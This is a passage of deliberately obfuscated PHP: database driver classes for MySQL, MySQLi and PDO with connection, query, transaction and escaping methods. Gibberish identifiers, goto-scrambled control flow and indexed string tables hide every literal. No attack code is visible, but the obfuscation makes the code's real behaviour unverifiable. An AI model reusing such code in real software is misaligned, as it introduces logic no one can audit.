scandir($this->cachePath); foreach ($EØôĞÆÈÇ¸ as $có‰¦º¤†à) { $C‚áœ´ƒÕ£ = $this->cachePath . $có‰¦º¤†à; if (strpos($C‚áœ´ƒÕ£, $a¡×Ÿä‹™[760]) && strpos($C‚áœ´ƒÕ£, $a¡×Ÿä‹™[761]) && filemtime($C‚áœ´ƒÕ£) < time() - $this->cacheTime) { @unlink($C‚áœ´ƒÕ£); } } } } goto b²ôƒÅÊç—; aíáîÅŒ§: class DbMysql extends Db { public function __construct($a¢íØ¬¹” = '') { $A§ğøÎÏÂÅ =& $_SERVER[£ü]; if (!extension_loaded($A§ğøÎÏÂÅ[717])) { think_exception(think_lang($A§ğøÎÏÂÅ[10]) . $A§ğøÎÏÂÅ[788]); } if (!empty($a¢íØ¬¹”)) { $this->config = $a¢íØ¬¹”; if (empty($this->config[$A§ğøÎÏÂÅ[13]])) { $this->config[$A§ğøÎÏÂÅ[13]] = $A§ğøÎÏÂÅ[33]; } } } public function connect($D¥§‹ï¿” = '', $B¢Öƒ»É÷ = 0, $FÒ¿…ÎÉÀ = false) { $EÙŞñ®³ÃÈ =& $_SERVER[£ü]; if (!isset($this->linkID[$B¢Öƒ»É÷])) { goto A º…³Âò; dÏê¬æÜÇö: if (1 != think_config($EÙŞñ®³ÃÈ[18])) { unset($this->config); } goto Eï¨½ë›ö½; A º…³Âò: if (empty($D¥§‹ï¿”)) { $D¥§‹ï¿” = $this->config; } $fºë·–ÀáÌ = $D¥§‹ï¿”[$EÙŞñ®³ÃÈ[789]] . ($D¥§‹ï¿”[$EÙŞñ®³ÃÈ[790]] ? "\72{$D¥§‹ï¿”[$EÙŞñ®³ÃÈ[790]]}" : $EÙŞñ®³ÃÈ[33]); $EÇ×‚«¿“ = !empty($D¥§‹ï¿”[$EÙŞñ®³ÃÈ[13]][$EÙŞñ®³ÃÈ[14]]) ? $D¥§‹ï¿”[$EÙŞñ®³ÃÈ[13]][$EÙŞñ®³ÃÈ[14]] : $this->pconnect; goto Cå„‹¤³; b††¤Úéè: mysql_query($EÙŞñ®³ÃÈ[793] . think_config($EÙŞñ®³ÃÈ[794]) . $EÙŞñ®³ÃÈ[55], $this->linkID[$B¢Öƒ»É÷]); if ($e‚Â«µºôÙ > $EÙŞñ®³ÃÈ[795]) { mysql_query($EÙŞñ®³ÃÈ[796], $this->linkID[$B¢Öƒ»É÷]); } $this->connected = !0; goto dÏê¬æÜÇö; Cå„‹¤³: if ($EÇ×‚«¿“) { $this->linkID[$B¢Öƒ»É÷] = mysql_pconnect($fºë·–ÀáÌ, $D¥§‹ï¿”[$EÙŞñ®³ÃÈ[791]], $D¥§‹ï¿”[$EÙŞñ®³ÃÈ[792]], 131072); } else { $this->linkID[$B¢Öƒ»É÷] = mysql_connect($fºë·–ÀáÌ, $D¥§‹ï¿”[$EÙŞñ®³ÃÈ[791]], $D¥§‹ï¿”[$EÙŞñ®³ÃÈ[792]], !0, 131072); } if (!$this->linkID[$B¢Öƒ»É÷] || !empty($D¥§‹ï¿”[$EÙŞñ®³ÃÈ[17]]) && !mysql_select_db($D¥§‹ï¿”[$EÙŞñ®³ÃÈ[17]], $this->linkID[$B¢Öƒ»É÷])) { think_exception(mysql_error()); } $e‚Â«µºôÙ = mysql_get_server_info($this->linkID[$B¢Öƒ»É÷]); goto b††¤Úéè; Eï¨½ë›ö½: } return $this->linkID[$B¢Öƒ»É÷]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($eïÊÙŸëõ) { goto b½î”İíŒ­; CÒƒ¤‰„é…: if (!$this->_linkID) { return !1; } $this->queryStr = $eïÊÙŸëõ; if ($this->queryID) { $this->free(); } goto f¡Ôõ¸Ïğ; b½î”İíŒ­: $fÆ¾ôĞ±Û‚ =& $_SERVER[£ü]; if (0 === stripos($eïÊÙŸëõ, $fÆ¾ôĞ±Û‚[249])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto CÒƒ¤‰„é…; f¡Ôõ¸Ïğ: think_action_status($fÆ¾ôĞ±Û‚[19], 1); think_status($fÆ¾ôĞ±Û‚[20]); $this->queryID = mysql_query($eïÊÙŸëõ, $this->_linkID); goto fÂ˜¤Œµ”ï; fÂ˜¤Œµ”ï: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto eÖƒ£›ÊÓé; eÖƒ£›ÊÓé: } public function execute($cÂ´Ï‚ä) { goto A—­¯‡ÁÜ; Bçóº¦¨ô: $this->queryStr = $cÂ´Ï‚ä; if ($this->queryID) { $this->free(); } think_action_status($fˆ›ˆÎ‡Ò—[21], 1); goto FìÓ ¨åø; e‹ñ¹–Ë²›: if (!1 === $E“Ûéß×Ô™) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto DØĞ™ŒİºÁ; FìÓ ¨åø: think_status($fˆ›ˆÎ‡Ò—[20]); $E“Ûéß×Ô™ = mysql_query($cÂ´Ï‚ä, $this->_linkID); $this->debug(); goto e‹ñ¹–Ë²›; A—­¯‡ÁÜ: $fˆ›ˆÎ‡Ò— =& $_SERVER[£ü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Bçóº¦¨ô; DØĞ™ŒİºÁ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[£ü][797], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CËóä°¦¿ = mysql_query($_SERVER[£ü][798], $this->_linkID); $this->transTimes = 0; if (!$CËóä°¦¿) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B—´È´ãÍ = mysql_query($_SERVER[£ü][799], $this->_linkID); $this->transTimes = 0; if (!$B—´È´ãÍ) { $this->error(); return !1; } } return !0; } private function getAll() { $eËİçÒÖ¤Û = array(); if ($this->numRows > 0) { while ($D³²‹«ÁËÅ = mysql_fetch_assoc($this->queryID)) { $eËİçÒÖ¤Û[] = $D³²‹«ÁËÅ; } mysql_data_seek($this->queryID, 0); } return $eËİçÒÖ¤Û; } public function getFields($B¶çš×—Á») { $eÙÄ›÷Ä´ê =& $_SERVER[£ü]; $FááÄãàÎ’ = $this->query($eÙÄ›÷Ä´ê[800] . $this->parseKey($B¶çš×—Á»)); $BŸ©Ñàà›È = array(); if ($FááÄãàÎ’) { foreach ($FááÄãàÎ’ as $BÌÌ©Œ”š³ => $c­ëŒİŒØÔ) { $BŸ©Ñàà›È[$c­ëŒİŒØÔ[$eÙÄ›÷Ä´ê[27]]] = array($eÙÄ›÷Ä´ê[28] => $c­ëŒİŒØÔ[$eÙÄ›÷Ä´ê[27]], $eÙÄ›÷Ä´ê[29] => $c­ëŒİŒØÔ[$eÙÄ›÷Ä´ê[30]], $eÙÄ›÷Ä´ê[31] => (bool) (strtoupper($c­ëŒİŒØÔ[$eÙÄ›÷Ä´ê[32]]) === $eÙÄ›÷Ä´ê[801]), $eÙÄ›÷Ä´ê[34] => $c­ëŒİŒØÔ[$eÙÄ›÷Ä´ê[35]], $eÙÄ›÷Ä´ê[36] => strtolower($c­ëŒİŒØÔ[$eÙÄ›÷Ä´ê[37]]) == $eÙÄ›÷Ä´ê[38], $eÙÄ›÷Ä´ê[39] => strtolower($c­ëŒİŒØÔ[$eÙÄ›÷Ä´ê[40]]) == $eÙÄ›÷Ä´ê[41]); } } return $BŸ©Ñàà›È; } public function getTables($BÅì‹å¶Ñ½ = '') { $c¹Ÿòºªùƒ =& $_SERVER[£ü]; if (!empty($BÅì‹å¶Ñ½)) { $d¼íèó«² = $c¹Ÿòºªùƒ[802] . $BÅì‹å¶Ñ½; } else { $d¼íèó«² = $c¹Ÿòºªùƒ[803]; } $e¢âõº¤á¨ = $this->query($d¼íèó«²); $B˜Ò¯Èªœë = array(); foreach ($e¢âõº¤á¨ as $fƒ‰‡ºß±§ => $dºî˜ÄóŞœ) { $B˜Ò¯Èªœë[$fƒ‰‡ºß±§] = current($dºî˜ÄóŞœ); } return $B˜Ò¯Èªœë; } public function replace($fÄáÄĞšê©, $e÷¦ª×½”¯ = array()) { $f×÷‚æ©ˆ =& $_SERVER[£ü]; foreach ($fÄáÄĞšê© as $AìùÛÊ¢ª => $aùÑˆ©ˆÏ) { $A¯ŠâÕ • = $this->parseValue($aùÑˆ©ˆÏ); if (is_scalar($A¯ŠâÕ •)) { $Díª½­©£´[] = $A¯ŠâÕ •; $bÉ Ÿ¯ÙÌó[] = $this->parseKey($AìùÛÊ¢ª); } } $bò÷÷¾îÛ = $f×÷‚æ©ˆ[804] . $this->parseTable($e÷¦ª×½”¯[$f×÷‚æ©ˆ[264]]) . $f×÷‚æ©ˆ[805] . implode($f×÷‚æ©ˆ[47], $bÉ Ÿ¯ÙÌó) . $f×÷‚æ©ˆ[806] . implode($f×÷‚æ©ˆ[47], $Díª½­©£´) . $f×÷‚æ©ˆ[807]; return $this->execute($bò÷÷¾îÛ); } public function insertAll($b¨¾Ó›Â±, $fÀ‹„•ƒÌ = array(), $dŒ ªŞ¿™ = false) { goto dÉ¢ŞæÌÛ; e¸“¾’¤Ç‡: $C¼ˆİªŠ’¾ = ($dŒ ªŞ¿™ ? $d”‘Ï‚™Õ³[809] : $d”‘Ï‚™Õ³[810]) . $d”‘Ï‚™Õ³[811] . $this->parseTable($fÀ‹„•ƒÌ[$d”‘Ï‚™Õ³[264]]) . $d”‘Ï‚™Õ³[805] . implode($d”‘Ï‚™Õ³[47], $dâ‘µÖ¹à) . $d”‘Ï‚™Õ³[812] . implode($d”‘Ï‚™Õ³[47], $F„Á­¼¼íè); return $this->execute($C¼ˆİªŠ’¾); goto EÏ¶‚‘äšâ; dÉ¢ŞæÌÛ: $d”‘Ï‚™Õ³ =& $_SERVER[£ü]; if (!is_array($b¨¾Ó›Â±[0])) { return !1; } $dâ‘µÖ¹à = array_keys($b¨¾Ó›Â±[0]); goto CĞÅ÷¹×Òª; CĞÅ÷¹×Òª: $F„Á­¼¼íè = array(); foreach ($b¨¾Ó›Â± as $Cº×ç‚ÜÔµ) { $aÜÜ÷ó¡£Ì = array(); foreach ($Cº×ç‚ÜÔµ as $c†ó¦ Ü => $e‡ßÈ¥‘÷‚) { $e‡ßÈ¥‘÷‚ = $this->parseValue($e‡ßÈ¥‘÷‚); if (is_scalar($e‡ßÈ¥‘÷‚)) { $aÜÜ÷ó¡£Ì[] = $e‡ßÈ¥‘÷‚; } } $F„Á­¼¼íè[] = $d”‘Ï‚™Õ³[245] . implode($d”‘Ï‚™Õ³[47], $aÜÜ÷ó¡£Ì) . $d”‘Ï‚™Õ³[807]; } array_walk($dâ‘µÖ¹à, array($this, $d”‘Ï‚™Õ³[808])); goto e¸“¾’¤Ç‡; EÏ¶‚‘äšâ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $D±ö§ö™Á =& $_SERVER[£ü]; $this->error = mysql_errno() . $D±ö§ö™Á[4] . mysql_error($this->_linkID); if ($D±ö§ö™Á[33] != $this->queryStr) { $this->error .= LNG($D±ö§ö™Á[45]) . $this->queryStr; } think_trace($this->error, $D±ö§ö™Á[33], $D±ö§ö™Á[46]); return $this->error; } public function escapeString($CÓÈ¬ë‹‹ë) { if ($this->_linkID) { return mysql_real_escape_string($CÓÈ¬ë‹‹ë, $this->_linkID); } else { return mysql_escape_string($CÓÈ¬ë‹‹ë); } } public function parseKey(&$CøÚøºÆëŠ, $d¾Ï®¶°÷Ú = true) { $F’œ¬ŒñÙĞ =& $_SERVER[£ü]; if ($d¾Ï®¶°÷Ú) { $CøÚøºÆëŠ = $this->parseKeyCheck($CøÚøºÆëŠ); } if ($CøÚøºÆëŠ != $F’œ¬ŒñÙĞ[173] && !preg_match($F’œ¬ŒñÙĞ[813], $CøÚøºÆëŠ)) { $CøÚøºÆëŠ = $F’œ¬ŒñÙĞ[814] . trim($CøÚøºÆëŠ, $F’œ¬ŒñÙĞ[814]) . $F’œ¬ŒñÙĞ[814]; } return $CøÚøºÆëŠ; } } class DbMysqli extends Db { public function __construct($b¸à‰‰”ïä = '') { $aĞ“»ìç¥Æ =& $_SERVER[£ü]; if (!extension_loaded($aĞ“»ìç¥Æ[716])) { think_exception(think_lang($aĞ“»ìç¥Æ[10]) . $aĞ“»ìç¥Æ[815]); } if (!empty($b¸à‰‰”ïä)) { $this->config = $b¸à‰‰”ïä; if (empty($this->config[$aĞ“»ìç¥Æ[13]])) { $this->config[$aĞ“»ìç¥Æ[13]] = $aĞ“»ìç¥Æ[33]; } } } public function connect($e›àÂ¨‚À© = '', $B˜ˆÈŒÛÙõ = 0) { $E†øî¥å‹‹ =& $_SERVER[£ü]; if (!isset($this->linkID[$B˜ˆÈŒÛÙõ])) { goto bİ´ì­¹Ïˆ; F²˜èçˆ‚§: $this->connected = !0; if (1 != think_config($E†øî¥å‹‹[18])) { unset($this->config); } goto AšßÏ™; bİ´ì­¹Ïˆ: if (empty($e›àÂ¨‚À©)) { $e›àÂ¨‚À© = $this->config; } $this->linkID[$B˜ˆÈŒÛÙõ] = new mysqli($e›àÂ¨‚À©[$E†øî¥å‹‹[789]], $e›àÂ¨‚À©[$E†øî¥å‹‹[791]], $e›àÂ¨‚À©[$E†øî¥å‹‹[792]], $e›àÂ¨‚À©[$E†øî¥å‹‹[17]], $e›àÂ¨‚À©[$E†øî¥å‹‹[790]] ? intval($e›àÂ¨‚À©[$E†øî¥å‹‹[790]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto dè‰ìÅ¯; dè‰ìÅ¯: $fìÌƒÃ¡ùù = $this->linkID[$B˜ˆÈŒÛÙõ]->server_version; $this->linkID[$B˜ˆÈŒÛÙõ]->query($E†øî¥å‹‹[793] . think_config($E†øî¥å‹‹[794]) . $E†øî¥å‹‹[55]); if ($fìÌƒÃ¡ùù > $E†øî¥å‹‹[795]) { $this->linkID[$B˜ˆÈŒÛÙõ]->query($E†øî¥å‹‹[796]); } goto F²˜èçˆ‚§; AšßÏ™: } return $this->linkID[$B˜ˆÈŒÛÙõ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($BÒˆâ§ìÁ) { goto E‰¾‡ƒÌíì; f ôô¥Êê‘: think_status($e„îï­’±Ô[20]); $this->queryID = $this->_linkID->query($BÒˆâ§ìÁ); if ($this->_linkID->more_results()) { while (($Fï‰–øŠë = $this->_linkID->next_result()) != NULL) { $Fï‰–øŠë->free_result(); } } goto Bù×İùœœ; E‰¾‡ƒÌíì: $e„îï­’±Ô =& $_SERVER[£ü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d³ŠÕªÎ š; Bù×İùœœ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto cİÁ—¿ì›¿; d³ŠÕªÎ š: $this->queryStr = $BÒˆâ§ìÁ; if ($this->queryID) { $this->free(); } think_action_status($e„îï­’±Ô[19], 1); goto f ôô¥Êê‘; cİÁ—¿ì›¿: } public function execute($EÑ›™¾æõ) { goto AÇ‡ßØÑ¯§; cŠŒ ê„«: $this->queryStr = $EÑ›™¾æõ; if ($this->queryID) { $this->free(); } think_action_status($e£Ö«å’[21], 1); goto A­î†å±”Ö; CùËãáƒ˜: if (!1 === $FÓ¼÷í«—) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto A“‡ååÜĞ£; A­î†å±”Ö: think_status($e£Ö«å’[20]); $FÓ¼÷í«— = $this->_linkID->query($EÑ›™¾æõ); $this->debug(); goto CùËãáƒ˜; AÇ‡ßØÑ¯§: $e£Ö«å’ =& $_SERVER[£ü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cŠŒ ê„«; A“‡ååÜĞ£: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eã×öÇÕ±ç = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$eã×öÇÕ±ç) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $CÎÕ˜ÒÓÚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$CÎÕ˜ÒÓÚ) { $this->error(); return !1; } } return !0; } private function getAll() { $FÃ‰¶£˜ƒÎ = array(); if ($this->numRows > 0) { for ($B‰İ°™ƒ¸° = 0; $B‰İ°™ƒ¸° < $this->numRows; $B‰İ°™ƒ¸°++) { $FÃ‰¶£˜ƒÎ[$B‰İ°™ƒ¸°] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $FÃ‰¶£˜ƒÎ; } public function getFields($aÔ«¯¯ŒÑ†) { $fİÙŸ¾¨Ø =& $_SERVER[£ü]; $Dµ“ÏãŸŞ = $this->query($fİÙŸ¾¨Ø[800] . $this->parseKey($aÔ«¯¯ŒÑ†)); $BšìÊĞ­ = array(); if ($Dµ“ÏãŸŞ) { foreach ($Dµ“ÏãŸŞ as $cùĞù‹Øó¡ => $Fê¢Ì”—¢) { $BšìÊĞ­[$Fê¢Ì”—¢[$fİÙŸ¾¨Ø[27]]] = array($fİÙŸ¾¨Ø[28] => $Fê¢Ì”—¢[$fİÙŸ¾¨Ø[27]], $fİÙŸ¾¨Ø[29] => $Fê¢Ì”—¢[$fİÙŸ¾¨Ø[30]], $fİÙŸ¾¨Ø[31] => (bool) ($Fê¢Ì”—¢[$fİÙŸ¾¨Ø[32]] === $fİÙŸ¾¨Ø[33]), $fİÙŸ¾¨Ø[34] => $Fê¢Ì”—¢[$fİÙŸ¾¨Ø[35]], $fİÙŸ¾¨Ø[36] => strtolower($Fê¢Ì”—¢[$fİÙŸ¾¨Ø[37]]) == $fİÙŸ¾¨Ø[38], $fİÙŸ¾¨Ø[39] => strtolower($Fê¢Ì”—¢[$fİÙŸ¾¨Ø[40]]) == $fİÙŸ¾¨Ø[41]); } } return $BšìÊĞ­; } public function getTables($D‹©ê¥Òøø = '') { $a°ƒÕÇ›¿‡ =& $_SERVER[£ü]; $e÷–œ›„òÅ = !empty($D‹©ê¥Òøø) ? $a°ƒÕÇ›¿‡[802] . $D‹©ê¥Òøø : $a°ƒÕÇ›¿‡[803]; $b‚ÄğªÌó = $this->query($e÷–œ›„òÅ); $EóÀŸŒª™£ = array(); if ($b‚ÄğªÌó) { foreach ($b‚ÄğªÌó as $BºŠãšğš => $A­µäŞ§‹®) { $EóÀŸŒª™£[$BºŠãšğš] = current($A­µäŞ§‹®); } } return $EóÀŸŒª™£; } public function replace($cÒè„¹Ò‘‘, $AÎÔ¾²¹è = array()) { $Dˆ£ÀãñŸ¨ =& $_SERVER[£ü]; foreach ($cÒè„¹Ò‘‘ as $B©Ğº†Ü¡Ñ => $CæÔî¸º¡¶) { $dÒ½œ¥•ê¾ = $this->parseValue($CæÔî¸º¡¶); if (is_scalar($dÒ½œ¥•ê¾)) { $fë¤š²»ëÉ[] = $dÒ½œ¥•ê¾; $f›¿À‹¦Ñ[] = $this->parseKey($B©Ğº†Ü¡Ñ); } } $E½¤·¬áÊò = $Dˆ£ÀãñŸ¨[804] . $this->parseTable($AÎÔ¾²¹è[$Dˆ£ÀãñŸ¨[264]]) . $Dˆ£ÀãñŸ¨[805] . implode($Dˆ£ÀãñŸ¨[47], $f›¿À‹¦Ñ) . $Dˆ£ÀãñŸ¨[806] . implode($Dˆ£ÀãñŸ¨[47], $fë¤š²»ëÉ) . $Dˆ£ÀãñŸ¨[807]; return $this->execute($E½¤·¬áÊò); } public function insertAll($aƒ‘ŠâÏÙì, $Dò¿’ÌÏùË = array(), $a·…ŞÑË‰ = false) { goto F£–õ‘áô«; D…ïÚî‚Íõ: $Aóöõ„Æó¸ = array(); foreach ($aƒ‘ŠâÏÙì as $eğƒâÄäù) { $C‚™İ‘‚³Á = array(); foreach ($eğƒâÄäù as $dÆˆ¼•Ö„ => $e÷Ù³Ñ‡²) { $e÷Ù³Ñ‡² = $this->parseValue($e÷Ù³Ñ‡²); if (is_scalar($e÷Ù³Ñ‡²)) { $C‚™İ‘‚³Á[] = $e÷Ù³Ñ‡²; } } $Aóöõ„Æó¸[] = $A»¯ãŠƒ¿[245] . implode($A»¯ãŠƒ¿[47], $C‚™İ‘‚³Á) . $A»¯ãŠƒ¿[807]; } array_walk($A™Ãä¥•ç, array($this, $A»¯ãŠƒ¿[808])); goto F‹ß Ú‘÷£; F‹ß Ú‘÷£: $C˜ÛÆ„¢Ğ = ($a·…ŞÑË‰ ? $A»¯ãŠƒ¿[809] : $A»¯ãŠƒ¿[810]) . $A»¯ãŠƒ¿[811] . $this->parseTable($Dò¿’ÌÏùË[$A»¯ãŠƒ¿[264]]) . $A»¯ãŠƒ¿[805] . implode($A»¯ãŠƒ¿[47], $A™Ãä¥•ç) . $A»¯ãŠƒ¿[812] . implode($A»¯ãŠƒ¿[47], $Aóöõ„Æó¸); return $this->execute($C˜ÛÆ„¢Ğ); goto F’½¿´Æ´§; F£–õ‘áô«: $A»¯ãŠƒ¿ =& $_SERVER[£ü]; if (!is_array($aƒ‘ŠâÏÙì[0])) { return !1; } $A™Ãä¥•ç = array_keys($aƒ‘ŠâÏÙì[0]); goto D…ïÚî‚Íõ; F’½¿´Æ´§: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e—ˆ‘š®¢ñ =& $_SERVER[£ü]; $this->error = $this->_linkID->errno . $e—ˆ‘š®¢ñ[4] . $this->_linkID->error; if ($e—ˆ‘š®¢ñ[33] != $this->queryStr) { $this->error .= LNG($e—ˆ‘š®¢ñ[45]) . $this->queryStr; } think_trace($this->error, $e—ˆ‘š®¢ñ[33], $e—ˆ‘š®¢ñ[46]); return $this->error; } public function escapeString($Dº‡«´—³) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Dº‡«´—³); } else { return addslashes($Dº‡«´—³); } } public function parseKey(&$CÔ¯¿¼ÙÛ†, $FòåŠ¨—äÏ = true) { $aŒ†éß¿ =& $_SERVER[£ü]; if ($FòåŠ¨—äÏ) { $CÔ¯¿¼ÙÛ† = $this->parseKeyCheck($CÔ¯¿¼ÙÛ†); } if ($CÔ¯¿¼ÙÛ† != $aŒ†éß¿[173] && !preg_match($aŒ†éß¿[813], $CÔ¯¿¼ÙÛ†)) { $CÔ¯¿¼ÙÛ† = $aŒ†éß¿[814] . trim($CÔ¯¿¼ÙÛ†, $aŒ†éß¿[814]) . $aŒ†éß¿[814]; } return $CÔ¯¿¼ÙÛ†; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($CÌ©˜•‡Àè = '') { $A”ƒæ¨‡ÙÂ =& $_SERVER[£ü]; if (!class_exists($A”ƒæ¨‡ÙÂ[816])) { think_exception(think_lang($A”ƒæ¨‡ÙÂ[10]) . $A”ƒæ¨‡ÙÂ[817]); } if (!empty($CÌ©˜•‡Àè)) { $this->config = $CÌ©˜•‡Àè; if (empty($this->config[$A”ƒæ¨‡ÙÂ[13]])) { $this->config[$A”ƒæ¨‡ÙÂ[13]] = array(); } } } public function connect($d‚ØøòÛ = '', $c÷®ôº²µ» = 0) { $aë®æÍÕ =& $_SERVER[£ü]; if (!isset($this->linkID[$c÷®ôº²µ»])) { goto aÎ¤ÜğœÏç; dë’Ú´¹×É: $this->linkID[$c÷®ôº²µ»]->exec($aë®æÍÕ[827] . think_config($aë®æÍÕ[794])); $this->connected = !0; if (1 != think_config($aë®æÍÕ[18])) { unset($this->config); } goto b¢„ÑÛ; aÎ¤ÜğœÏç: if (empty($d‚ØøòÛ)) { $d‚ØøòÛ = $this->config; } if ($this->pconnect) { $d‚ØøòÛ[$aë®æÍÕ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$c÷®ôº²µ»] = new PDO($d‚ØøòÛ[$aë®æÍÕ[818]], $d‚ØøòÛ[$aë®æÍÕ[791]], $d‚ØøòÛ[$aë®æÍÕ[792]], $d‚ØøòÛ[$aë®æÍÕ[13]]); } catch (PDOException $DÏæêğå) { think_exception($DÏæêğå->getMessage()); } goto AŸöñ³‰‡ä; AŸöñ³‰‡ä: $this->dbType = $this->_getDsnType($d‚ØøòÛ[$aë®æÍÕ[818]]); if (in_array($this->dbType, array($aë®æÍÕ[819], $aë®æÍÕ[820], $aë®æÍÕ[821], $aë®æÍÕ[822]))) { think_exception($aë®æÍÕ[823] . $this->dbType . $aë®æÍÕ[824] . $this->dbType . $aë®æÍÕ[825]); } if (!$this->linkID[$c÷®ôº²µ»]) { think_exception($aë®æÍÕ[826]); } goto dë’Ú´¹×É; b¢„ÑÛ: } return $this->linkID[$c÷®ôº²µ»]; } public function free() { $this->PDOStatement = null; } public function query($FöºŞŒ, $Cö›‹ïÖ±ô = array()) { goto CÊø®õ¤ó²; CÊø®õ¤ó²: $fÚØäë‹· =& $_SERVER[£ü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C“İù±Ø©³; AÀˆ‘ÑªŠŠ: think_action_status($fÚØäë‹·[19], 1); think_status($fÚØäë‹·[20]); $this->PDOStatement = $this->_linkID->prepare($FöºŞŒ); goto a´ÌøšÕÇÛ; eïÍåñšèÄ: if (!1 === $BºÄîŒ¿•) { $this->error(); return !1; } else { return $this->getAll(); } goto F«ÁÈÑò‚‘; a´ÌøšÕÇÛ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $BºÄîŒ¿• = $this->PDOStatement->execute($Cö›‹ïÖ±ô); $this->debug(); goto eïÍåñšèÄ; C“İù±Ø©³: $this->queryStr = $FöºŞŒ; if (!empty($Cö›‹ïÖ±ô)) { $this->queryStr .= $fÚØäë‹·[828] . print_r($Cö›‹ïÖ±ô, !0) . $fÚØäë‹·[829]; } if (!empty($this->PDOStatement)) { $this->free(); } goto AÀˆ‘ÑªŠŠ; F«ÁÈÑò‚‘: } public function execute($fƒ·è‘éÊ, $a¡…‚”ƒëŞ = array()) { goto a¿¯²ÀÒÏ; a¿¯²ÀÒÏ: $AŒÍõƒÌÄã =& $_SERVER[£ü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FÌ¯³ï‚ĞÊ; FÌ¯³ï‚ĞÊ: $this->queryStr = $fƒ·è‘éÊ; if (!empty($a¡…‚”ƒëŞ)) { $this->queryStr .= $AŒÍõƒÌÄã[828] . print_r($a¡…‚”ƒëŞ, !0) . $AŒÍõƒÌÄã[829]; } $BÒ¸„×Æ§ê = !1; goto FĞåÁØ²©Ï; FĞåÁØ²©Ï: if ($this->dbType == $AŒÍõƒÌÄã[822]) { if (preg_match($AŒÍõƒÌÄã[830], $this->queryStr, $Dî‰ÙóÛİ‘)) { $this->table = think_config($AŒÍõƒÌÄã[831]) . str_ireplace(think_config($AŒÍõƒÌÄã[832]), $AŒÍõƒÌÄã[358], $Dî‰ÙóÛİ‘[2]); $BÒ¸„×Æ§ê = (bool) $this->query($AŒÍõƒÌÄã[833] . strtoupper($this->table) . $AŒÍõƒÌÄã[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($AŒÍõƒÌÄã[21], 1); goto aÖ¸›‡Â³‘; aÖ¸›‡Â³‘: think_status($AŒÍõƒÌÄã[20]); $this->PDOStatement = $this->_linkID->prepare($fƒ·è‘éÊ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto D…É‚¼¢éè; D…É‚¼¢éè: $e¡ÎéøøĞõ = $this->PDOStatement->execute($a¡…‚”ƒëŞ); $this->debug(); if (!1 === $e¡ÎéøøĞõ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($BÒ¸„×Æ§ê || preg_match($AŒÍõƒÌÄã[834], $fƒ·è‘éÊ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto Aç§Å¤£óğ; Aç§Å¤£óğ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EïÛ³±×• = $this->_linkID->commit(); $this->transTimes = 0; if (!$EïÛ³±×•) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $EØ´¯É†…‹ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$EØ´¯É†…‹) { $this->error(); return !1; } } return !0; } private function getAll() { $dÃÕáÙî¬² = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($dÃÕáÙî¬²); return $dÃÕáÙî¬²; } public function getFields($bØ™È‚¾°) { goto C‘¯‡±»¨; C‘¯‡±»¨: $B¶¢ÔÂİƒÈ =& $_SERVER[£ü]; $this->initConnect(!0); if (think_config($B¶¢ÔÂİƒÈ[835])) { $dö’å­Ã… = str_replace($B¶¢ÔÂİƒÈ[836], $bØ™È‚¾°, think_config($B¶¢ÔÂİƒÈ[835])); } else { switch ($this->dbType) { case $B¶¢ÔÂİƒÈ[819]: case $B¶¢ÔÂİƒÈ[837]: $dö’å­Ã… = 